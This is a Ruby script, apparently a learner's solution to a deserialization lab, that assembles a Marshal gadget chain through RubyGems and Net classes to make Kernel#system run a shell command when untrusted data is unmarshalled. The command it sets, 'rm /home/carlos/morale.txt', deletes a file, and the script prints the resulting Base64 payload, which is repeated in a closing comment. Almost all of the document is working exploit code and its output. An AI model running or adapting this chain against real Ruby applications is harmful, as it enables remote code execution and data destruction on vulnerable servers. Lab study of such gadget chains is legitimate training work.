#this will run without errors in Ruby 2.6.5
Gem::SpecFetcher
Gem::Installer

# prevent the payload from running when we Marshal.dump it
module Gem                          # define Gem module
  class Requirement
    def marshal_dump                # modify serialisation method in class requirement
      [@requirements]      #return an array containing the @requirements instance variable of thSSSe Gem::Requirement object
    end
  end
end

wa1 = Net::WriteAdapter.new(Kernel, :system)
=begin 
new instance of the Net::WriteAdapter

Kernel is a Ruby module serving as the root namespace for methods available globally 
in Ruby. :system is a symbol representing the system method, 
which is used to execute shell commands from within Ruby.
=end

rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)      #instance varaible sets equated to wa1
rs.instance_variable_set('@git_set', "rm /home/carlos/morale.txt")       #changed from id to rm

wa2 = Net::WriteAdapter.new(rs, :resolve)

=begin
the Net class may be implementing the Adapter design pattern for output ops. 
which allows objects with incompatible interfaces to work together 
by adapting one interface to another.
=end

i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")


n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)

t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)

r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)

payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])   #serialisation 
puts Base64.encode64(payload)     

=begin

BAhbCGMVR2VtOjpTcGVjRmV0Y2hlcmMTR2VtOjpJbnN0YWxsZXJVOhVHZW06
OlJlcXVpcmVtZW50WwZvOhxHZW06OlBhY2thZ2U6OlRhclJlYWRlcgY6CEBp
b286FE5ldDo6QnVmZmVyZWRJTwc7B286I0dlbTo6UGFja2FnZTo6VGFyUmVh
ZGVyOjpFbnRyeQc6CkByZWFkaQA6DEBoZWFkZXJJIghhYWEGOgZFVDoSQGRl
YnVnX291dHB1dG86Fk5ldDo6V3JpdGVBZGFwdGVyBzoMQHNvY2tldG86FEdl
bTo6UmVxdWVzdFNldAc6CkBzZXRzbzsOBzsPbQtLZXJuZWw6D0BtZXRob2Rf
aWQ6C3N5c3RlbToNQGdpdF9zZXRJIh9ybSAvaG9tZS9jYXJsb3MvbW9yYWxl
LnR4dAY7DFQ7EjoMcmVzb2x2ZQ==

=end